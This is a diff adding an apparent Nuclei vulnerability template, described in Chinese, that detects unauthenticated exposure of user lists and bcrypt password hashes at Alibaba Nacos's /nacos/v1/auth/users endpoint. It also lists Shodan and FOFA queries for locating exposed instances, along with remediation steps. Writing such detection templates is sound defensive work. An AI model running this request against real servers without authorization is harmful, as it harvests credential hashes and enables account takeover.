@@ -1,0 +1,57 @@
+id: nacos-auth-users-info-leak
+
+info:
+  name: Alibaba Nacos 未授权用户信息泄露
+  author: dahe
+  severity: high
+  description: |
+    Alibaba Nacos 在未开启或未正确校验鉴权时，`/nacos/v1/auth/users` 接口可能直接返回用户列表信息。攻击者可在未登录状态下获取用户名及密码哈希，进而辅助口令攻击、账号枚举和后续权限滥用。
+  impact: |
+    - 攻击者可枚举 Nacos 账号并获取密码哈希，扩大暴力破解、撞库或离线口令分析的成功率。
+    - 若返回结果中包含默认管理员或高权限账号，后续可能进一步造成控制台接管、配置泄露或管理操作滥用。
+  remediation: |
+    - 启用并强制校验 Nacos 鉴权，确保 `/nacos/v1/auth/users` 仅对管理员或受控身份开放。
+    - 及时升级到受支持版本，并核查控制台与 OpenAPI 的访问控制策略是否正确生效。
+    - 轮换已暴露账号的密码，避免继续使用可能已泄露的密码哈希对应口令。
+  reference:
+    - https://github.com/alibaba/nacos/issues/4701
+    - https://github.com/alibaba/nacos/issues/4593
+    - https://nacos.io/en-us/docs/auth.html
+  classification:
+    cwe-id: CWE-200
+    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"Nacos"
+    fofa-query: app="NACOS"
+    product: nacos
+    vendor: alibaba
+  tags: nacos,unauth,info-leak,misconfig,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=999&search=accurate"
+      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=999&search=accurate"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: regex
+        part: body
+        regex:
+          - '"totalCount"\s*:\s*\d+'
+          - '"pageItems"\s*:\s*\['
+          - '"username"\s*:\s*"[^"]+"'
+          - '"password"\s*:\s*"\$2a\$'
+        condition: and
